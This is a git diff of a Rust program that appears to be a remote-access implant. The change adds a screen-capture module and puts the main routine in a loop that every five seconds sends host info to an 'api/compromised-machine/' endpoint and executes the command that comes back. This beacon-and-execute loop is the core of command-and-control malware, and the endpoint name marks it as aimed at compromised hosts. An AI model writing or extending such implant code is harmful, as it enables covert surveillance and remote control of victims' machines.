@@ -3,6 +3,7 @@ mod requests;
 mod utils;
 mod processCommand;
 mod listdir;
+mod screencapture;
 
 use reqwest::Method;
 use serde::{Deserialize, Serialize};
@@ -22,21 +23,26 @@ struct Response2{
 
 const  url:&str = "http://localhost/api/compromised-machine/";
 
+
 fn main() {
     
     let info = basicinfo::basic_info();
-    let get_resp  = send_json_request(Method::GET, url, Some(&info));
+    loop{
+        std::thread::sleep(std::time::Duration::from_secs(5));
+        let get_resp  = send_json_request(Method::GET, url, Some(&info));
 
-    let message = match get_resp {
-        Ok(resp) => resp,
-        Err(e) => {
-            eprintln!("Error sending request: {}", e);
-            return;
-        }
-    };
+        let message = match get_resp {
+            Ok(resp) => resp,
+            Err(e) => {
+                eprintln!("Error sending request: {}", e);
+                return;
+            }
+        };
 
-    println!("{}" , message);
+        println!("{}" , message);
 
-    processCommand::filter_command(&message);
+        processCommand::filter_command(&message);
+    }
+    
    
 }
